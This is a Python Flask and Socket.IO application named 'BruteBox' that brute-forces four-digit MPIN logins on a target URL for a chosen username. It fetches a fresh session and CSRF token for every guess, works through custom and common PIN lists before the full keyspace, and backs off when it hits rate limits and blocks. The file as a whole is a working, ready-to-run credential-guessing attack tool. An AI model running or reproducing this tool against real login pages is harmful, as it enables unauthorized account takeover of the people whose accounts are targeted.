import os
import threading
import time
import requests
from bs4 import BeautifulSoup
from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-change-in-production'
socketio = SocketIO(app, cors_allowed_origins="*")

active_tasks = {}
pause_events = {}

class WebBruteForcer:
    def __init__(self, url, username, sid, stop_event, pause_event, custom_pins=None):
        self.url = url.rstrip('/')
        self.username = username
        self.sid = sid
        self.stop_event = stop_event
        self.pause_event = pause_event
        self.custom_pins = custom_pins or []
        self.found = False
        self.attempts = 0
        self.start_time = time.time()
        self.rate_limit_hits = 0
        self.block_hits = 0
        self.csrf_rotations = 0
        self.response_times = []
        self.last_csrf = None
        self.csrf_lock = threading.Lock()

    def emit_progress(self, event, data):
        socketio.emit(event, data, room=self.sid)

    def wait_if_paused(self):
        while self.pause_event.is_set() and not self.stop_event.is_set():
            time.sleep(0.3)

    def _extract_csrf(self, html):
        try:
            soup = BeautifulSoup(html, "html.parser")
            el = soup.find("input", {"name": "_token"})
            if el:
                return el["value"]
        except Exception:
            pass
        return None

    def _fresh_session(self):
        """Get a brand new session with fresh CSRF token every single call."""
        try:
            session = requests.Session()
            resp = session.get(self.url, timeout=8)
            token = self._extract_csrf(resp.text)
            if token:
                with self.csrf_lock:
                    if self.last_csrf and self.last_csrf != token:
                        self.csrf_rotations += 1
                    self.last_csrf = token
                return session, token
        except Exception:
            pass
        return None, None

    def get_security_rating(self):
        score = 0
        signals = []

        if self.rate_limit_hits > 0:
            score += 2
            signals.append(f'Rate limiting detected ({self.rate_limit_hits}x)')
        if self.block_hits > 0:
            score += 3
            signals.append(f'IP/account blocking detected ({self.block_hits}x)')
        if self.csrf_rotations > 5:
            score += 2
            signals.append(f'CSRF token rotation active ({self.csrf_rotations}x)')
        elif self.csrf_rotations > 0:
            score += 1
            signals.append(f'Basic CSRF protection present')

        avg_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0
        if avg_time > 2.0:
            score += 2
            signals.append(f'Intentional response delay (~{avg_time:.1f}s avg)')
        elif avg_time > 1.0:
            score += 1
            signals.append(f'Moderate response time (~{avg_time:.1f}s avg)')

        if score >= 6:
            rating, color = 'FORTRESS', 'fortress'
        elif score >= 4:
            rating, color = 'STRONG', 'strong'
        elif score >= 2:
            rating, color = 'MODERATE', 'moderate'
        else:
            rating, color = 'WEAK', 'weak'

        return {'rating': rating, 'color': color, 'signals': signals, 'score': score}

    def try_mpin(self, mpin):
        if self.found or self.stop_event.is_set():
            return None

        self.wait_if_paused()

        if self.found or self.stop_event.is_set():
            return None

        mpin_str = str(mpin).zfill(4)

        # Fresh session every PIN -- guarantees valid CSRF every time
        # Retry up to 3 times if session fetch fails
        session, token = None, None
        for _ in range(3):
            session, token = self._fresh_session()
            if session and token:
                break
            time.sleep(0.5)

        if not session or not token:
            self.emit_progress('log', {
                'message': f'[WARN] Could not get session for PIN {mpin_str} -- skipping',
                'type': 'warn'
            })
            return None

        try:
            post_data = {
                "username": self.username,
                "password": mpin_str,
                "_token": token
            }

            t_start = time.time()
            response = session.post(self.url, data=post_data, timeout=8)
            elapsed_req = time.time() - t_start
            self.response_times.append(elapsed_req)

            self.attempts += 1

            if self.attempts % 10 == 0:
                elapsed = time.time() - self.start_time
                self.emit_progress('progress', {
                    'attempts': self.attempts,
                    'current': mpin_str,
                    'elapsed': round(elapsed, 1),
                    'speed': round(self.attempts / elapsed, 2) if elapsed > 0 else 0
                })

            try:
                json_response = response.json()
                if json_response.get("signal") == "success":
                    self.found = True
                    return mpin_str
                elif "blocked" in str(json_response).lower() or "limit" in str(json_response).lower():
                    self.block_hits += 1
                    self.emit_progress('log', {
                        'message': f'[BLOCK] Defense triggered: {json_response}',
                        'type': 'warn'
                    })
                    time.sleep(2)
            except Exception:
                if response.status_code == 302:
                    self.found = True
                    return mpin_str
                elif response.status_code == 419:
                    self.csrf_rotations += 1
                    self.emit_progress('log', {
                        'message': f'[CSRF] 419 on {mpin_str}',
                        'type': 'warn'
                    })
                elif response.status_code == 429:
                    self.rate_limit_hits += 1
                    self.emit_progress('log', {
                        'message': '[RATE] Rate limit -- throttling...',
                        'type': 'warn'
                    })
                    time.sleep(3)

        except Exception:
            pass

        return None

    def run(self):
        common_pins = [
            1234, 1111, 0000, 1212, 7777, 1004, 2000, 4444, 2222, 6969,
            9999, 3333, 5555, 6666, 1122, 1313, 8888, 4321, 2001, 1010,
            1230, 1235, 1236, 1237, 1238, 1239, 1112, 1113, 1114, 1115,
            1001, 1002, 1003, 1005, 1006, 1007, 1008, 1009, 1011, 1012
        ]

        self.emit_progress('log', {'message': '[INIT] BruteBox engine online', 'type': 'info'})
        self.emit_progress('log', {'message': '[INFO] Fresh session mode -- guaranteed CSRF validity', 'type': 'info'})

        # Phase 1: Custom wordlist
        if self.custom_pins:
            self.emit_progress('log', {'message': f'[SCAN] Testing {len(self.custom_pins)} custom PINs...', 'type': 'info'})
            for mpin in self.custom_pins:
                if self.stop_event.is_set():
                    self.emit_progress('log', {'message': '[HALT] Operator abort received.', 'type': 'warn'})
                    return
                self.wait_if_paused()
                result = self.try_mpin(mpin)
                if result:
                    security = self.get_security_rating()
                    elapsed = time.time() - self.start_time
                    self.emit_progress('success', {
                        'mpin': result, 'attempts': self.attempts,
                        'elapsed': round(elapsed, 1), 'security': security
                    })
                    return
            self.emit_progress('log', {'message': '[SCAN] Custom list exhausted.', 'type': 'info'})

        # Phase 2: Common PINs
        self.emit_progress('log', {'message': '[SCAN] Loading common PIN dictionary...', 'type': 'info'})
        for i, mpin in enumerate(common_pins):
            if self.stop_event.is_set():
                self.emit_progress('log', {'message': '[HALT] Operator abort received.', 'type': 'warn'})
                return
            self.wait_if_paused()
            result = self.try_mpin(mpin)
            if result:
                security = self.get_security_rating()
                elapsed = time.time() - self.start_time
                self.emit_progress('success', {
                    'mpin': result, 'attempts': self.attempts,
                    'elapsed': round(elapsed, 1), 'security': security
                })
                return
            if (i + 1) % 10 == 0:
                self.emit_progress('log', {'message': f'[SCAN] Dictionary {i+1}/40 tested', 'type': 'info'})

        self.emit_progress('log', {'message': '[SCAN] Dictionary exhausted. Switching to full keyspace...', 'type': 'info'})

        # Phase 3: Full range -- fully sequential, fresh session per PIN
        tested = set(common_pins) | set(self.custom_pins)
        all_mpins = [mpin for mpin in range(10000) if mpin not in tested]
        chunks = [all_mpins[i:i+100] for i in range(0, len(all_mpins), 100)]

        for chunk_idx, chunk in enumerate(chunks):
            if self.stop_event.is_set() or self.found:
                break

            self.wait_if_paused()

            if chunk_idx % 10 == 0:
                pct = int((chunk_idx / len(chunks)) * 100)
                bar = '#' * (pct // 5) + '.' * (20 - pct // 5)
                self.emit_progress('log', {
                    'message': f'[SCAN] {chunk[0]:04d}-{chunk[-1]:04d} [{bar}] {pct}%',
                    'type': 'scan'
                })

            for mpin in chunk:
                if self.stop_event.is_set() or self.found:
                    break
                self.wait_if_paused()
                result = self.try_mpin(mpin)
                if result:
                    security = self.get_security_rating()
                    elapsed = time.time() - self.start_time
                    self.emit_progress('success', {
                        'mpin': result, 'attempts': self.attempts,
                        'elapsed': round(elapsed, 1), 'security': security
                    })
                    return

        security = self.get_security_rating()
        total_time = time.time() - self.start_time
        self.emit_progress('fail', {
            'attempts': self.attempts,
            'elapsed': round(total_time, 1),
            'security': security
        })


# ---------- Socket.IO event handlers ----------
@socketio.on('connect')
def handle_connect():
    print('Client connected')

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    if sid in active_tasks:
        active_tasks[sid].set()
        del active_tasks[sid]
    if sid in pause_events:
        del pause_events[sid]
    print('Client disconnected')

@socketio.on('start_bruteforce')
def handle_start(data):
    url = data.get('url')
    username = data.get('username')
    custom_raw = data.get('custom_pins', '')
    sid = request.sid

    if not url or not username:
        emit('error', {'message': 'URL and username are required'})
        return

    custom_pins = []
    if custom_raw:
        for p in custom_raw.replace(',', '\n').splitlines():
            p = p.strip().zfill(4)
            if p.isdigit() and len(p) == 4:
                custom_pins.append(int(p))

    if sid in active_tasks:
        active_tasks[sid].set()

    stop_event = threading.Event()
    pause_event = threading.Event()
    active_tasks[sid] = stop_event
    pause_events[sid] = pause_event

    def task():
        forcer = WebBruteForcer(url, username, sid, stop_event, pause_event, custom_pins)
        forcer.run()
        if sid in active_tasks:
            del active_tasks[sid]
        if sid in pause_events:
            del pause_events[sid]

    thread = threading.Thread(target=task)
    thread.daemon = True
    thread.start()

    emit('log', {'message': '[INIT] BruteBox engaged...', 'type': 'info'})

@socketio.on('pause_bruteforce')
def handle_pause():
    sid = request.sid
    if sid in pause_events:
        pause_events[sid].set()
        emit('log', {'message': '[PAUSE] Operation paused.', 'type': 'warn'})
        emit('paused')

@socketio.on('resume_bruteforce')
def handle_resume():
    sid = request.sid
    if sid in pause_events:
        pause_events[sid].clear()
        emit('log', {'message': '[RESUME] Operation resumed.', 'type': 'info'})
        emit('resumed')

@socketio.on('stop_bruteforce')
def handle_stop():
    sid = request.sid
    if sid in pause_events:
        pause_events[sid].clear()
    if sid in active_tasks:
        active_tasks[sid].set()
        emit('log', {'message': '[HALT] Stop signal received.', 'type': 'warn'})
    else:
        emit('log', {'message': '[WARN] No active operation.', 'type': 'warn'})

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    socketio.run(app, debug=True)
